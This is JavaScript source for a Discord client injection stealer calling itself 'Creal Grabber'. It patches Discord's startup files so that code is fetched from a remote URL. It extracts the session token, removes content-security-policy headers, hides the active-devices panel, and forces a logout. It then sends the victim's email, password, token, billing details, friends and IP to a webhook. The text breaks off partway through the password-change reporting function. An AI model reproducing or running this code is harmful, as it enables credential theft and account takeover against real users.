const fs = require('fs');
const path = require('path');
const {
    BrowserWindow,
    session
} = require('electron')
const args = process.argv;
const querystring = require('querystring');
const os = require('os')
const https = require("https");
const computerName = os.hostname();

const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function(index, string) {
    if (index > 0) {
        return this.substring(0, index) + string + this.substr(index);
    }

    return string + this;
};

const config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": 374276,

    injection_url: "",
    webhook: "%WEBHOOK%",
    filter2: {
        urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
    },
};



let bannerurl = ""
let usericonurl = ""

const discordPath = (function() {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === "win32") {
        resourcePath = path.join(app, "resources");
    } else if (process.platform === "darwin") {
        resourcePath = path.join(app, "Contents", "Resources");
    }
    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return "", "";
})();

function updateCheck() {
    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(appPath, "index.js");
    const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: "discord",
                    main: "index.js",
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
const indexJS = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJS).size
fs.readFileSync(indexJS, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJS);
        res.replace('core' + 'num', indexJS).replace('%WEBHOOK%', '${config.webhook}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, "app.asar")}')
if (fs.existsSync(bdPath)) require(bdPath);`;

        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
    }
    if (!fs.existsSync(path.join(__dirname, "Creal"))) return !0;
    execScript(
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    );
    return !1;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};

async function noSessionPlease() {
    await sleep(1000)
    execScript(`
function userclick() {
    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
}

function IsSession(item) {
    return item?.innerText?.includes("Devices")
}

function handler(e) {
    e = e || window.event;
    var target = e.target || e.srcElement,
    text = target.textContent || target.innerText;   
    if (IsSession(target)) userclick()
}
function waitForElm(selector) {
    return new Promise(resolve => {
        const observer = new MutationObserver(mutations => {
            if (document.querySelectorAll(selector).length>2) {
                resolve(document.querySelectorAll(selector))
            observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
}
document.addEventListener('click',handler,false);
`)
};

noSessionPlease()




session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(config.webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }


    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})




const hooker = async (content) => {
    const data = JSON.stringify(content);
    const url = new URL(config.webhook);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
    };
    const req = https.request(options);

    req.on("error", (err) => {
        console.log(err);
    });
    req.write(data);
    req.end();
};


async function FirstTime() {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {

        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "Creal"))) {
                fs.rmdirSync(path.join(__dirname, "Creal"));
                if (token == null || token == undefined || token == "") {
                    var {
                        ip
                    } = await getFromURL("https://www.myexternalip.com/json", null)
                    const c = {
                        username: "Creal",
                        content: "",
                        embeds: [{
                            title: "Creal Initalized",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                                inline: !1
							}],
                            author: {
                                name: "Creal"
                            },
                            footer: {
                                text: "©Creal | https://github.com/Ayhuuuu"
                            }
						}]
                    };
                    hooker(c)
                } else {
                    var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                    var {
                        ip
                    } = await getFromURL("https://www.myexternalip.com/json", null)
                    
                    if(b.avatar === null){
                        usericonurl = "https://cdn.discordapp.com/attachments/864559355768602654/1040289089372557433/8df7a3389893f1d1ce1d4351c4076440.jpg"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://cdn.discordapp.com/attachments/864559355768602654/1041090918733852833/d70a5a9283d9517a10c4a7e14d0c9074.png"
                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                    const c = {
                        username: "Creal",
                        content: "",
                        embeds: [{
                            title: "Creal Initalized",
                            description: "[ │ **Oh you have Creal someone**](https://github.com/Ayhuuu)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                inline: !1
								}, {
                                name: "Username <:icon4:1024615934519955496> ",
                                value: `\`${b.username}#${b.discriminator}\``,
                                inline: !0
								}, {
                                name: "ID <:icon3:1024615933228109834>",
                                value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                inline: !0
								}, {
                                name: "Badges <:icon5:1024615931869147146>",
                                value: `${GetBadges(b.flags)}`,
                                inline: !0
								}, {
                                name: "Language <:language:1037057832920547398>",
                                value: `${GetLangue(b.locale)}`,
                                inline: !0
								}, {
                                name: "NSFW <a:nsfw:1037067109907320883>",
                                value: `${GetNSFW(b.nsfw_allowed)}`,
                                inline: !1
								}, {
                                name: "A2F <a:a2f:1037084050826997902>",
                                value: `${GetA2F(b.mfa_enabled)}`,
                                inline: !0
								}, {
                                name: "@Copyright",
                                value: `[Creal 2021 ](https://github.com/Ayhuuu)`,
                                inline: !0
								}, {
                                name: "Token <a:icon1:1024615171907407892>",
                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                inline: !1
								}],

                            footer: {
                                text: "©Creal | https://github.com/Ayhuuu"
                            },
                            image: {
                                url: bannerurl,
                            },
                            thumbnail: {
                                url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                            }
							}]
                    };

                    hooker(c)
                };




                if (!fs.existsSync(path.join(__dirname, "Creal"))) {
                    return !0
                }

                fs.rmdirSync(path.join(__dirname, "Creal"));
                if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            var {
                                ip
                            } = await getFromURL("https://www.myexternalip.com/json", null)
                            const c = {
                                username: "Creal Grabber",
                                content: "",
                                embeds: [{
                                    title: "Creal User log out (User not Logged in before)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                                        inline: !1
							}],
                                    author: {
                                        name: "Creal"
                                    },
                                    footer: {
                                        text: "©Creal| https://github.com/Ayhuuuu"
                                    }
						}]
                            };
                            hooker(c)

                        } else {
                            var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                            var {
                                ip
                            } = await getFromURL("https://www.myexternalip.com/json", null)
                            if(b.avatar === null){
                                usericonurl = "https://cdn.discordapp.com/attachments/864559355768602654/1040289089372557433/8df7a3389893f1d1ce1d4351c4076440.jpg"
                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                            if(b.banner === null){
                                bannerurl = "https://cdn.discordapp.com/attachments/864559355768602654/1041090918733852833/d70a5a9283d9517a10c4a7e14d0c9074.png"
                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                            const c = {
                                username: "Creal Grabber",
                                content: "",
                                embeds: [{
                                    title: "Creal Victim got logged out",
                                    description: "[ │ **Oh you have Creal someone**](https://github.com/Ayhuuu)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                        inline: !1
								}, {
                                        name: "Username <:icon4:1024615934519955496> ",
                                        value: `\`${b.username}#${b.discriminator}\``,
                                        inline: !0
								}, {
                                        name: "ID <:icon3:1024615933228109834>",
                                        value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                        inline: !0
								}, {
                                        name: "Badges <:icon5:1024615931869147146>",
                                        value: `${GetBadges(b.flags)}`,
                                        inline: !0
								}, {
                                        name: "NSFW <a:nsfw:1037067109907320883>",
                                        value: `${GetNSFW(b.nsfw_allowed)}`,
                                        inline: !1
								}, {
                                        name: "A2F <a:a2f:1037084050826997902>",
                                        value: `${GetA2F(b.mfa_enabled)}`,
                                        inline: !0
								}, {
                                        name: "@Copyright",
                                        value: `[Creal 2021 ](https://github.com/Ayhuuu)`,
                                        inline: !0
								}, {
                                        name: "Token <a:icon1:1024615171907407892>",
                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                        inline: !1
								}],

                                    footer: {
                                        text: "©Creal | https://github.com/Ayhuuu"
                                    },
                                    image: {
                                        url: bannerurl,
                                    },
                                    thumbnail: {
                                        url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                    }
							}]
                            };
                            hooker(c)
                        }
                    }


                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
                }
                return !1
            }
        }
    }))
}


const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}




async function saveidtofile(text, name) {
    fs.open(name, function(err) {
        if (err) return;
    });
    fs.appendFile(name, `${text}\n`, function(err) {
        if (err) return;
    });
}


async function deletefile(name) {
    fs.unlink(`${name}`, function(err) {
        if (err) return;
    });
}


async function getFromURL(url, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var b = await window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`, !0)
    return b
}

async function getFromURLnp(url, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var b = await window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );`, !0)
    return b
}



async function getservers(token) {
    var guilds = await getFromURL("https://discord.com/api/v8/users/@me/guilds", token)
    await guilds.filter(a => a.owner == true && a.icon).forEach(async a => {
        if (a.icon == null) return
        let Crealidguild = a.id;
        saveidtofile(Crealidguild, "Creal_guilds_ids.txt");
    });
    setTimeout(async () => {
        if (fs.existsSync('Creal_guilds_ids.txt')) {
            const guild_id = await fs.readFileSync('Creal_guilds_ids.txt', 'utf-8').split("\n");
            guild_id.forEach(async id => {
                setTimeout(async () => {
                    if (id == null || id == "\n" || id == " ") return;
                    var b = await getFromURL(`https://discord.com/api/v8/guilds/${id}/preview`, token)
                    if (100 > b.approximate_member_count) return
                    if (b.name == "undefined") return
                    saveidtofile(`---------------------------\n+ Name: ${b.name}\n+ ID: ${b.id}\n+ Members: ${b.approximate_member_count}\n\n`, "Creal_guilds_result.txt");
                }, 2000);
            });
        }
    }, 2000)
}




function GetNSFW(reader) {
    if (reader == true) {
        return "🔞 `NSFW Allowed`"
    }
    if (reader == false) {
        return "🔞 `NSFW Not Allowed`"
    } else {
        return "Idk bro you got me"
    }
}

function GetA2F(reader) {
    if (reader == true) {
        return "🔒 `A2F Enabled`"
    }
    if (reader == false) {
        return "🔓 `A2F Not Enabled`"
    } else {
        return "Idk bro you got me"
    }
}



function GetNitro(flags) {
    if (flags == 0) {
        return "No Nitro"
    }
    if (flags == 1) {
        return "<:classic:896119171019067423> \`Nitro Classic\`"
    }
    if (flags == 2) {
        return "<a:boost:824036778570416129> \`Nitro Boost\`"
    } else {
        return "No Nitro"
    }
}

function GetRBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if (badges == "") {
        badges = ""
    }
    return badges
}

function GetLangue(read) {
    const France = 'fr';
    const Dansk = 'da';
    const Deutsch = 'de';
    const englishUK = 'en-GB';
    const englishUS = 'en-US';
    const espagnol = 'es-ES';
    const hrvatski = 'hr';
    const italianio = 'it';
    const lietuviskai = 'lt';
    const magyar = 'hu';
    const neerland = 'nl';
    const Norsk = 'no';
    const polski = 'pl';
    const portugues = 'pr-BR';
    const Romana = 'ro';
    const finlandais = 'fi';
    const svenska = 'sv-SE';
    const tiengviet = 'vi';
    const turk = 'tr';
    const cestina = 'cs';
    const grecque = 'el';
    const bulgar = 'bg';
    const russe = 'ru';
    const ukrainier = 'uk';
    const inde = 'hi';
    const thai = 'th';
    const chineschina = 'zh-CN';
    const japonais = 'ja';
    const chinestaiwan = 'zh-TW';
    const korea = 'ko';
    var langue = "";
    if (read == France) {
        langue += "🇫🇷 French"
    }
    if (read == Dansk) {
        langue += "🇩🇰 Dansk"
    }
    if (read == Deutsch) {
        langue += "🇩🇪 Deutsch"
    }
    if (read == englishUK) {
        langue += "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English"
    }
    if (read == englishUS) {
        langue += "🇺🇸 USA"
    }
    if (read == espagnol) {
        langue += "🇪🇸 Espagnol"
    }
    if (read == hrvatski) {
        langue += "🇭🇷 Croatian"
    }
    if (read == italianio) {
        langue += "🇮🇹 Italianio"
    }
    if (read == lietuviskai) {
        langue += "🇱🇹 Lithuanian"
    }
    if (read == magyar) {
        langue += "🇭🇺 Hungarian"
    }
    if (read == neerland) {
        langue += "🇳🇱 Dutch"
    }
    if (read == Norsk) {
        langue += "🇳🇴 Norwegian"
    }
    if (read == polski) {
        langue += "🇵🇱 Polish"
    }
    if (read == portugues) {
        langue += "🇵🇹 Portuguese"
    }
    if (read == Romana) {
        langue += "🇷🇴 Romanian"
    }
    if (read == finlandais) {
        langue += "🇫🇮 Finnish"
    }
    if (read == svenska) {
        langue += "🇸🇪 Swedish"
    }
    if (read == turk) {
        langue += "🇹🇷 Turkish"
    }
    if (read == tiengviet) {
        langue += "🇻🇳 Vietnamese"
    }
    if (read == cestina) {
        langue += "🇨🇿 Czech"
    }
    if (read == grecque) {
        langue += "🇬🇷 Greek"
    }
    if (read == bulgar) {
        langue += "🇧🇬 Bulgarian"
    }
    if (read == russe) {
        langue += "🇷🇺 Russian"
    }
    if (read == ukrainier) {
        langue += "🇺🇦 Ukrainian"
    }
    if (read == inde) {
        langue += "🇮🇳 Indian"
    }
    if (read == thai) {
        langue += "🇹🇼 Taiwanese"
    }
    if (read == chineschina) {
        langue += "🇨🇳 Chinese-China"
    }
    if (read == japonais) {
        langue += "🇯🇵 Japanese"
    }
    if (read == chinestaiwan) {
        langue += "🇨🇳 Chinese-Taiwanese"
    }
    if (read == korea) {
        langue += "🇰🇷 Korean"
    }
    if (langue == "") {
        langue = "None"
    }
    return langue
}

function GetBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "<:bravery:874750808388952075> "
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "<:brilliance:874750808338608199> "
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "<:balance:874750808267292683> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}



async function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
        window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
            function totalFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                return r.length
            }

            function CalcFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                var gay = "";
                for (z of r) {
                    var b = GetRBadges(z.user.public_flags)
                    if (b != "") {
                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                    }
                }
                if (gay == "") {
                    gay = "No Rare Friends"
                }
                return gay
            }

            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return "\`❌\`"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += "\`✔️\`" + " :credit_card:"
                    } else {
                        return "\`❌\`"
                    }
                })
                if (billing == "") {
                    billing = "\`❌\`"
                }
                return billing
            }
            if(b.avatar === null){
                usericonurl = "https://cdn.discordapp.com/attachments/864559355768602654/1040289089372557433/8df7a3389893f1d1ce1d4351c4076440.jpg"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
            if(b.banner === null){
                bannerurl = "https://cdn.discordapp.com/attachments/864559355768602654/1041090918733852833/d70a5a9283d9517a10c4a7e14d0c9074.png"
            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
            
            const params = {
                username: "Creal Grabber",
                content: "",
                embeds: [{
                    "title": "Creal User Login",
                    description: "[ │ **Oh you have Creal someone**](https://github.com/Ayhuuu)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                        inline: !1
												}, {
                        name: "Username <:icon4:1024615934519955496> ",
                        value: `\`${info.username}#${info.discriminator}\``,
                        inline: !0
												}, {
                        name: "ID <:icon3:1024615933228109834>",
                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                        inline: !0
												}, {
                        name: "Nitro <a:_diamond:1018223518913150977>",
                        value: `${GetNitro(info.premium_type)}`,
                        inline: !0
												}, {
                        name: "Badges <:icon5:1024615931869147146>",
                        value: `${GetBadges(info.flags)}`,
                        inline: !0
												}, {
                        name: "Language <:language:1037057832920547398>",
                        value: `${GetLangue(info.locale)}`,
                        inline: !0
												}, {
                        name: "NSFW <a:nsfw:1037067109907320883>",
                        value: `${GetNSFW(info.nsfw_allowed)}`,
                        inline: !1
												}, {
                        name: "A2F <a:a2f:1037084050826997902>",
                        value: `${GetA2F(info.mfa_enabled)}`,
                        inline: !0
												}, {
                        name: "@Copyright",
                        value: `[Creal 2021 ](https://github.com/Ayhuuu)`,
                        inline: !0
												}, {
                        name: "Billing <a:icon8:1024619392652288071>",
                        value: `${Cool()}`,
                        inline: !1
												}, {
                        name: "Email <a:Email:1024615399314161744>",
                        value: `\`${email}\``,
                        inline: !0
												}, {
                        name: "Password <a:icon6:1024617637390598164>",
                        value: `\`${password}\``,
                        inline: !0
												}, {
                        name: "Token <a:icon1:1024615171907407892>",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                        inline: !1
												}, ],

                    "footer": {
                        "text": "©Creal | https://github.com/Ayhuuu"
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}, {
                    "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(),

                    "footer": {
                        "text": "©Creal| https://github.com/Ayhuuu"
                    },
                    "image": {
                        'url': `${bannerurl}`,
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}]
            }
            hooker(params)
        })
    })
}




async function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
        window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

            function totalFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                return r.length
            }

            function CalcFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                var gay = "";
                for (z of r) {
                    var b = GetRBadges(z.user.public_flags)
                    if (b != "") {
                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                    }
                }
                if (gay == "") {
                    gay = "No Rare Friends"
                }
                return gay
            }

            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return "\`❌\`"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += "\`✔️\`" + " :credit_card:"
                    } else {
                        return "\`❌\`"
                    }
                })
                if (billing == "") {
                    billing = "\`❌\`"
                }
                return billing
            }
            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
            const params = {
                username: "Creal Grabber",
                content: "",
                embeds: [{
                    "title": "Creal Detect Password Changed",
                    description: "[ │ **Oh you have Creal someone**](https://github.com/Ayhuuu)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                        inline: !1
												}, {
                        name: "Username <:icon4:1024615934519955496> ",
                        value: `\`${info.username}#${info.discriminator}\``,
                        inline: !0
												}, {
                        name: "ID <:icon3:1024615933228109834>",
                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                        inline: !0
												}, {
                        name: "Nitro <a:_diamond:1018223518913150977>",
                        value: `${GetNitro(info.premium_type)}`,
                        inline: !0
												}, {
                        name: "Badges <:icon5:1024615931869147146>",
                        value: `${GetBadges(info.flags)}`,
                        inline: !0
												}, {
                        name: "Language <:language:1037057832920547398>",
                        value: `${GetLangue(info.locale)}`,
                        inline: !0
												}, {
                        name: "NSFW <a:nsfw:1037067109907320883>",
                        value: `${GetNSFW(info.nsfw_allowed)}`,
                        inline: !1
												}, {
                        name: "A2F <a:a2f:1037084050826997902>",
                        value: `${GetA2F(info.mfa_enabled)}`,
                        inline: !0
												}, {
                        name: "@Copyright",
                        value: `[Creal 2021 ](https://github.com/Ayhuuu)`,
                        inline: !0
												}, {
